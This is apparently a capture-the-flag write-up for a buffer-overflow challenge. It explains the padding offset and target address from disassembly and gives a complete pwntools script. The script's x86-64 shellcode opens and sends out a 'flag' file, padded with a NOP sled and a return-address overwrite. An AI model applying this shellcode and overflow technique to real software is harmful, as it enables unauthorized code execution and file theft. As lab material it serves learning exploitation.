# Hijack to (Mapped) Shellcode (hard)

#### Same as the last challenge only its reintroducing having to point to the input buffer and overflow the return. Disassemble challenge and find the buffer. It's 0x20 (32) + 8 = 40 bytes of padding. Now look for the target address, there's a cmp for a specific one, in this case $0x1a317000. The challenge also eats 4096 bytes, meaning if the shellcode doesn't equal that, anything after will be considered part of the shellcode. It expects an input, but doesn't compare to anything so I just used a newline.
```asm
0x0000000000001f66 <+304>:   mov    -0x8(%rbp),%rdx
0x0000000000001f6a <+308>:   lea    -0x20(%rbp),%rax

0x0000000000001e9c <+102>:   cmp    $0x1a317000,%rax

0x0000000000001ef1 <+187>:   mov    $0x1000,%edx
0x0000000000001ef6 <+192>:   mov    %rax,%rsi
0x0000000000001ef9 <+195>:   mov    $0x0,%edi
0x0000000000001efe <+200>:   call   0x1130 <read@plt>

0x0000000000001f41 <+267>:   call   0x1140 <getchar@plt>
```
------------------------------------------------------------------------

#### Put the padding for the 4096 in with the assembly code.
```python
from pwn import *
import sys

context.arch = 'amd64'

asmbly = """
xor rsi, rsi
push rsi
mov rdi, 0x67616c662f2f2f2f
push rdi
mov rdi, rsp
push 2
pop rax
xor rdx, rdx
syscall

mov rsi, rax
push 1
pop rdi
xor r10, r10
mov r10w, 1000
push 40
pop rax
xor rdx, rdx
syscall

push 60
pop rax
syscall
"""

asmbly = asm(asmbly)
fill = asmbly + b'\x90' * (4096 - len(asmbly))
pad = b"A" * 40
t_addr = p64(0x1a317000)
sys.stdout.buffer.write(fill + b'\n' + pad + t_addr)
```
